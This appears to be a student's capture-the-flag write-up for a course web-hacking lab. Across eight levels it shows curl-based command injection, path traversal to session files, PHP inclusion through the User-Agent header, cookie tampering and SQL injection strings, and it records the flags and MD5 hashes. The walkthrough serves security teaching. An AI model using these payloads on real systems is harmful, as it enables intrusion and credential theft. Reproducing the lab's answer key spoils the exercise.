@@ -1,0 +1,165 @@
+Web Hacking Report
+
+
+Level 1 Description:
+I used firefox to navigate to the website provided at the start. 
+I navigated to the form.html site. 
+Using the developer tools, I looked at the JS to examine the verify button and its function. 
+Upon inspection, the correct username was 'script' and the correct password was 'kiddie.'
+Entering it gave the alert with the secret: Your First Blood.
+Using python, I converted this phrase to an MD5 hash using the following script:
+
+import hashlib
+
+md5_hash = hashlib.md5()
+md5_hash.update(b'Your First Blood')
+hash_value = md5_hash.hexdigest()
+
+print(hash_value) 
+
+Level 1 MD5 Hash: cd3d9cadf1ef30f7dc5802e823116310
+To access level 2: navigate to http://pwnthemall.cse543.rev.fish:8082/cd3d9cadf1ef30f7dc5802e823116310
+
+
+
+
+Level 2 Description:
+From the level 2 landing page, I navigated to the active users page /users.html
+I inspected the html code and in the get users function there is an asynchronous HTTP request to /cgi-bin/users.php with a filter parameter appended to this. 
+
+I did a get request and appended a filter to that url: curl http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter='secret'
+This was not successful. I saw that the Referrer Policy was strict-origin-when-cross-origin meaning that the header referer must be users.html page so I used -H to modify the header of my request and then append some command line instructions to view the files and read the secret text: 
+
+curl -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter=';ls;cat%20secretuser.txt'
+<pre>
+myid
+secretuser.txt
+users.php
+allyourbasebelongtous
+</pre>
+
+I then converted the text to MD5 hash using the same python script in Level 1.
+
+Level 2 MD5 Hash: 41e33f8c6719f97e1ac00d745e6a25c5
+To access level 3: navigate to http://pwnthemall.cse543.rev.fish:8083/41e33f8c6719f97e1ac00d745e6a25c5
+
+
+
+
+Level 3 Description: 
+I entered the fields for First, Last, and Email with Mike Pence and the email given. It gave me the following petition:
+
+Thanks for signing the petition.
+Your ID is 44b33c4d233f8fd8c296a7a07d737d06 
+
+I removed all of the fields except for ID which I filled in using the previous info. 
+Your comment was: Hack the planet! 
+
+I then converted the text to MD5 hash using the same python script in Level 1.
+
+Level 3 MD5 Hash: ba49a4555854299152eb44d2619bc5bf
+To access level 4: navigate to http://pwnthemall.cse543.rev.fish:8084/ba49a4555854299152eb44d2619bc5bf
+
+
+
+
+Level 4 Description:
+I used the vulnerability in level 2 to traverse and found the tmp directory with the name of a session file I believed to be mike pence's:
+curl -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter=';cd%20..;cd%20..;cd%20..;cd%20..;cd%20..;cd%20..;cd%20tmp;ls'
+
+I then used the level 04 web page and entered the relative path from level 04 which I saw was two directories down from the directory where /tmp/sess was when I was traversing using the level 02 exploit:
+
+../../tmp/sess_91c7e1e10744d69fd8fe35ecfc
+
+The output was:
+username|s:7:"mike_pence";password|s:17:"thisissuchasimplesecret";nonce|i:893397759; 
+
+I then converted the text to MD5 hash using the same python script in Level 1.
+
+Level 4 MD5 Hash: 9b87ecb29600dd01b9e32d2cd268a9a4
+To access level 5: navigate to http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4
+
+
+
+
+Level 5 Description:
+I did a curl request to the landing page and saw the http code:
+curl http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4
+I found the headers I needed to use to retrieve the store script.
+
+I used the following command to retrieve the script for storing the passwords and found a hardcoded id, site, username, password, and admin info:
+curl -b "blacklist=store" -d "id=123456789&site=1&username=mike_pence&password=password&admin=1" http://pwnthemall.cse543.rev.fish:8085/cgi-bin/store
+
+if debug:
+    id = "foo1337"
+    site = "www.bar.com"
+    username = "john"
+    password = "pazzword"
+    admin = "1"
+
+I used this information on the retrieve function to get the following information and used it in a curl command to retrieve the passwords that were stored for bank.com. I sorted through to see the password for mike_pence and converted it to MD5 hash.
+
+www.bar.com:john:pazzword
+
+www.bar.com:john:pazzword
+
+www.bar.com:john:pazzword
+
+www.bar.com:john:terriblechoice
+
+www.bar.com:john:terriblechoice
+
+curl --cookie "site=www.bank.com;password=terriblechoice;blacklist=retrieve" -d "id=foo1337&site=www.bar.com&admin=1" http://pwnthemall.cse543.rev.fish:8085/cgi-bin/retrieve
+
+password for mike_pence: wel0vesecurity
+
+Level 5 MD5 Hash: fdf1f06b0422dc2746c7daff964c5307
+To access level 6: navigate to  http://pwnthemall.cse543.rev.fish:8086/fdf1f06b0422dc2746c7daff964c5307
+
+
+
+
+Level 6:
+curl http://pwnthemall.cse543.rev.fish:8086/fdf1f06b0422dc2746c7daff964c5307
+
+I noticed a level06 file in the tmp directory when using the command line injection in previous levels:
+level6_test.php
+system("cat s3cr37.pwd");
+
+The User Agent header allows for PHP file inclusion. I executed the following command to execute the file mentioned above:
+ curl -A "../../../../../../tmp/level6_test" http://pwnthemall.cse543.rev.fish:8086/cgi-bin/index.php
+
+The result was SuperMegaSecretNoGuessing which I converted to MD5 hash.
+
+Level 6 MD5 Hash:c84f270fa1ae043894c2d758bb17da2e
+To access level 7: http://pwnthemall.cse543.rev.fish:8087/c84f270fa1ae043894c2d758bb17da2e
+
+
+
+
+Level 7:
+Being told the injection point, I started experimenting with what to put as the username on the createuser.php page. The following worked to show every log made:
+' OR '1'='1'--'
+
+From there I experimented trying to get more columns from the tables. I knew I would need to combine another sql query but needed to know the table names and columns:
+
+admin OR 1=1 UNION SELECT * FROM information_schema.tables 
+
+' OR '1'='1' UNION SELECT * FROM users WHERE password='password'--'
+
+' OR '1'='1' 'UNION SELECT * FROM information_schema.tables'--'
+
+admin UNION SELECT password, username,firstname,lastname,NULL,NULL,NULL from users
+
+Eventually, I was able to get the password from a combination of these sql queries to get the password of admin: GoodInjectionCongrats
+
+To get to level 8: http://pwnthemall.cse543.rev.fish:8088/27bb383ab58a22c8618d2ebad60606f7
+
+Level 7 MD5 Hash:27bb383ab58a22c8618d2ebad60606f7
+
+
+
+
+Level 8:
+I guessed username and password for the fields and was able to get the web page to say successfully authenticated. I checked burp suite to monitor the traffic. I noticed there was another request to v1 leaks with a dummytoken being sent. I am not sure what needed to be done with this but I was unable to get the flag for this level. Will the method of cracking this level be revealed once grading is done? I really want to know how to do this.
+Level 8 MD5 Hash:
